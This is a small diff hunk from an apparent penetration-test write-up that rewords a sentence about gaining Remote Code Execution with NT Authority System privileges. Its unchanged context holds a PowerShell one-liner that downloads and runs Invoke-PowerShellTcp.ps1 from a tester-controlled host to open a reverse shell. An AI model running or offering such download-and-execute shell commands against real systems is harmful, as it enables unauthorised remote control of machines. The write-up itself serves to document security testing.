@@ -116,7 +116,7 @@ Taking advantage of the payload, the tester successfully initiated a reverse TCP
 ```bash
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
 ```
-Consequently, the tester achieved a  Remote Code Execution (RCE) with NT/Authority System privileges.
+Consequently, the tester established Remote Code Execution (RCE) with NT/Authority System privileges.
 ![](/assets/AV/system.png)  
 
 ## Reference  {#section-4}
